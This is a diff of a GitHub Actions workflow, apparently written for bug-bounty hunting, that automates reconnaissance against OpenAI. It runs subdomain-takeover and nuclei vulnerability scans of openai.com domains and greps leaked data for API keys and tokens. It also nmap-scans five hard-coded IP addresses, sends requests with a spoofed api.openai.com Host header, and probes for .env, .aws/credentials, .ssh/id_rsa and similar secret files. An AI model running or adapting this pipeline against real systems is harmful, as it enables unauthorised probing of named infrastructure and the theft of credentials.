@@ -1,102 +1,65 @@
-name: Apex-oombi
+name: Parallel OpenAI oombi
+
 on:
   workflow_dispatch:
 
 jobs:
-  # JOB 1: DNS & TAKEOVERS (Independent)
-  dns-takeover:
+  audit-origins:
+    name: Audit IP ${{ matrix.target_ip }}
     runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-      - name: Install Tools
-        run: |
-          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
-          go install github.com/haccer/subjack@latest
-          sudo mv ~/go/bin/* /usr/local/bin/
-      - name: Scan Takeovers
-        run: |
-          subfinder -d openai.com -silent > all_subs.txt
-          subjack -w all_subs.txt -t 100 -timeout 30 -o takeover_results.txt -ssl || true
-      - name: Upload
-        uses: actions/upload-artifact@v4
-        with:
-          name: dns-findings
-          path: takeover_results.txt
+    strategy:
+      fail-fast: false
+      matrix:
+        # Fixed the list formatting to be strictly compliant
+        target_ip: 
+          - "43.202.58.124"
+          - "43.202.58.199"
+          - "13.125.127.14"
+          - "43.202.58.155"
+          - "43.202.58.133"
 
-  # JOB 2: GITHUB LEAK PARSER (Independent - No Network Required)
-  github-leaks:
-    runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-      - name: Parse Local Leaks JSON
+      - name: Install Security Tools
         run: |
-          mkdir -p github_findings
-          # Extracting URLs from your 6,128 hits
-          jq -r '.items[].html_url' leaks.json > github_findings/links.txt
-          # Count most suspicious file names
-          jq -r '.items[].name' leaks.json | sort | uniq -c | sort -nr > github_findings/file_counts.txt
-      - name: Upload
-        uses: actions/upload-artifact@v4
-        with:
-          name: github-leaks
-          path: github_findings/
+          sudo apt-get update
+          sudo apt-get install -y nmap curl
 
-  # JOB 3: VULNERABILITY SCANNING (Nuclei)
-  vuln-scan:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-      - name: Nuclei Scan
+      - name: 1. Service & Version Detection
+        # This checks if the server is leaking specific software versions (exploitable)
         run: |
-          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-          sudo mv ~/go/bin/nuclei /usr/local/bin/
-          # Scanning known subdomains for high-severity CVEs
-          nuclei -u https://openai.com,https://chatgpt.com,https://platform.openai.com -severity critical,high -o vuln_results.txt
-      - name: Upload
-        uses: actions/upload-artifact@v4
-        with:
-          name: nuclei-results
-          path: vuln_results.txt
+          echo "### Infrastructure Report for ${{ matrix.target_ip }} ###" > report.md
+          echo "Scan Time: $(date)" >> report.md
+          nmap -sV -T4 -Pn -p 22,80,443,3306,8080,8443,9000 ${{ matrix.target_ip }} >> report.md
 
-  # JOB 4: HISTORY ANALYSIS (Memory Intensive)
-  history-logic:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-      - name: Reassemble & Grep
+      - name: 2. Host-Header Bypass Evidence
         run: |
-          curl -L "https://docs.google.com/uc?export=download&id=1vD2GpVHiMlR1wmoQfxcZfIpKeCRuadZx" -o history.txt
-          mkdir -p history_out
-          # Hunting for the 'Gold' in your 25MB file
-          grep -iE "apikey=|token=|secret=|auth=" history.txt > history_out/secrets.txt || true
-          grep -iE "\.env|\.git|\.config|\.bak|\.sql" history.txt > history_out/files.txt || true
-      - name: Upload
-        uses: actions/upload-artifact@v4
-        with:
-          name: history-data
-          path: history_out/
+          echo -e "\n### HTTP Evidence (api.openai.com) ###" >> report.md
+          # Grabbing full headers to see Server types and X-Headers
+          curl -I -s -H "Host: api.openai.com" http://${{ matrix.target_ip }}/ >> report.md
+          
+          echo -e "\n--- Branded Asset Search ---" >> report.md
+          # Search for OpenAI favicon in WordPress feeds
+          curl -s -H "Host: api.openai.com" http://${{ matrix.target_ip }}/feed/ | grep -o "favicon-100x100.png" >> report.md || echo "No favicon found." >> report.md
+          # Search for internal Matomo config leaks
+          curl -s -H "Host: api.openai.com" http://${{ matrix.target_ip }}/ | grep "trusted_hosts" >> report.md || echo "No Matomo config leak." >> report.md
 
-  # JOB 5: FINAL AGGREGATOR (Wait for all to finish)
-  final-report:
-    needs: [dns-takeover, github-leaks, vuln-scan, history-logic]
-    if: always() # Run even if one of the above fails
-    runs-on: ubuntu-latest
-    steps:
-      - name: Download all
-        uses: actions/download-artifact@v4
-      - name: Merge Report
+      - name: 3. The Jackpot Scan (Sensitive Files)
+        # These are the P1+ files. If any return 200, the bounty is huge.
         run: |
-          echo "=== APEX MASTER REPORT ===" > summary.txt
-          echo "DNS: $(cat dns-findings/takeover_results.txt || echo 'No Takeovers')" >> summary.txt
-          echo "Vulns: $(cat nuclei-results/vuln_results.txt || echo 'No Vulns')" >> summary.txt
-          echo "GitHub links found: $(wc -l < github-leaks/links.txt)" >> summary.txt
-      - name: Final Upload
+          echo -e "\n--- Critical File Discovery ---" >> report.md
+          PATHS=(".env" ".git/config" "phpinfo.php" "wp-config.php.bak" ".aws/credentials" ".bash_history" ".ssh/id_rsa")
+          for path in "${PATHS[@]}"; do
+            STATUS=$(curl -s -o /dev/null -w "%{http_code}" -m 3 -H "Host: api.openai.com" http://${{ matrix.target_ip }}/$path)
+            if [ "$STATUS" == "200" ]; then
+              echo "[CRITICAL] Found $path - Status $STATUS" >> report.md
+            else
+              echo "Path $path - Status $STATUS" >> report.md
+            fi
+          done
+
+      - name: Upload Report
         uses: actions/upload-artifact@v4
         with:
-          name: COMPLETE-REPORT
-          path: summary.txt
+          name: audit-${{ matrix.target_ip }}
+          path: report.md
           
